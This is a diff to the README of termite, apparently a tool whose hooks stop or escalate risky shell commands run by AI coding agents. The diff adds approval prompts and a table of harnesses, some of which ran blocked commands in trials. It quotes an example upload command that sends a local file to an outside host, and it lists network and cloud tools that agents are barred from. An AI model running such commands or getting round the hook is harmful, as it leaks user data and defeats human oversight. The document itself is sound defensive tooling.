@@ -70,7 +70,7 @@ Names are the ones in the table below, such as `tmite hooks install claude codex
 
 The first change keeps the file as it was, next to the new one, with `.termite-backup` added to its name. Later changes leave that copy alone.
 
-Hooks can only stop a command. A command that passes still goes through your harness's own approval rules.
+A hook never approves a command. It can stop a command, or [hand it to you](#commands-that-need-approval) in your harness's own prompt. A command that passes still goes through your harness's own approval rules.
 
 If you moved a settings folder with `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `COPILOT_HOME` or `HERMES_HOME`, the hook goes in that folder instead. The variable must hold a full path.
 
@@ -104,11 +104,12 @@ Each time the agent wants to run a shell command, the harness starts `tmite hook
 2. Finds the command and the working folder, in the place where that harness puts them.
 3. Rates the command with the same rules as `TERMITE_AGENT=1 tmite check`. No model takes part, and nothing runs.
 4. Answers in the harness's own format.
-5. Writes a log entry if it stopped something.
+5. Writes a log entry if it stopped something or asked you.
 
 The hook stops the command if:
 
-- The command is risky under the [agent rules](#stop-an-agent-running-destructive-commands-or-sending-data-out).
+- The command is critical, or at level 4 or 5.
+- The command is risky under the [agent rules](#stop-an-agent-running-destructive-commands-or-sending-data-out) and [can't go to a person](#commands-that-need-approval).
 - The message is too large, isn't valid JSON, or holds an empty command.
 - The message holds no command, and the tool [could run one](#harnesses-that-send-every-tool).
 - The working folder isn't known.
@@ -148,15 +149,42 @@ The agent gets the level, the reason and the command, and it is told not to try 
 
 ```text
 termite stopped this command. Don't try another way to do the same thing: tell the person what you wanted to run and why.
-✗ command:1  level 4, critical: sends data off the machine, can carry data off the machine, changes something
+✗ command:1  level 4, critical: sends data off the machine, can carry data off the machine, may change something
     curl -d @notes.txt https://example.com/upload
 ```
 
 If you want the command to run, read it, then run it yourself in your own terminal.
 
-`tmite alerts` shows when hooks stopped something. It doesn't keep the command, so read the command in the agent's session. If a stop can't be logged, the hook prints a line on standard error, which your harness may not show. `tmite provenance verify` tells you why.
+`tmite alerts` shows when hooks stopped something or asked you. It doesn't keep the command or what you answered, so read the command in the agent's session. If a stop can't be logged, the hook prints a line on standard error, which your harness may not show. `tmite provenance verify` tells you why.
 
 A hook has no setting that lets one command through. If an ordinary command keeps stopping, it may be a rule that is too strict, so [open an issue](https://github.com/tanepiper/termite/issues).
+
+### Commands that need approval
+
+Some commands aren't safe for an agent to run alone, but a person could reasonably say yes to them, such as a cloud command or a network lookup. The hook sorts each command in this way:
+
+| Answer | Which commands | What happens |
+|---|---|---|
+| Pass | Fit for an agent | The harness's own rules decide |
+| Needs approval | Not fit for an agent, at levels 0 to 3, and not critical | Your harness shows its own prompt, with termite's reason. Yes runs the command, and no doesn't |
+| Stop | Level 4 or 5, anything critical, or input that can't be read | The command stops, and nobody is asked |
+
+A script takes the worst answer of its commands.
+
+The question goes out as a normal reply, so a harness that ignored it would run the command. For this reason, a harness only gets the question after a live trial has shown that it prompts, that no stops the command, and that the command doesn't run when nobody can answer. The trial must also cover any mode that approves everything, or the hook must be able to see that mode. Everywhere else, the command stops, and the agent is told to give you the command to run yourself.
+
+| Harness | Commands that need approval |
+|---|---|
+| Claude Code | Asks you, except in bypass permissions mode, which stops the command. Where nobody can answer, the command doesn't run |
+| GitHub Copilot CLI | Stops, because VS Code reads the same hook and looks the same to it |
+| Antigravity `agy` | Stops, because its setting that approves everything hasn't been tried |
+| Antigravity app and IDE | Stops, because this hasn't been tried |
+| GitHub Copilot in VS Code | Stops, because Allow all ran the command with no prompt in a trial, and the hook can't see that mode |
+| Cursor | Stops, because its agent ran the command in a trial |
+| Codex | Stops, because it lets the command continue |
+| Gemini CLI, Hermes Agent, goose, OpenCode, Windsurf | Stops, because this hasn't been tried |
+
+`tmite hooks verify` shows which of your hooks can ask. No flag or setting turns the question on for another harness.
 
 ### Harnesses that send every tool
 
@@ -175,7 +203,7 @@ If both include Claude Code's settings, every Claude Code hook also runs in VS C
 tmite hooks install copilot
 ```
 
-Start a new chat after you change these settings. This hook hasn't been tested in VS Code yet, so check it by asking the agent to run the `curl` command from the prompt above. VS Code's newer Copilot session target finds hooks in a different way from the local one, so test it there too if you use it.
+Start a new chat after you change these settings. This hook hasn't been tested in VS Code yet, so check it by asking the agent to run the `curl` command from the prompt above. Commands that need approval stop in VS Code for now. VS Code's newer Copilot session target finds hooks in a different way from the local one, so test it there too if you use it.
 
 To use the Claude Code plugin instead of the settings file, `tmite` must be on the `PATH` that Claude Code gets:
 
@@ -225,6 +253,8 @@ An agent gets stricter rules than a person, because nobody reads its commands fi
 - Anything that can carry data to another machine, at any level. This includes `curl` and `wget` to other machines, `ssh`, `scp`, DNS lookups, cloud tools, uploads, publishing, the clipboard, and opening a web address.
 
 Work that stays on the machine, such as `curl` to `localhost`, still passes. So does a short list of `az` commands that only show settings, never secrets or tokens. Every other cloud command stops, so run it yourself.
+
+`tmite check` only passes or stops. The [hooks](#commands-that-need-approval) can ask you about some of these commands in place of stopping them.
 
 The exit status tells your harness what to do:
 
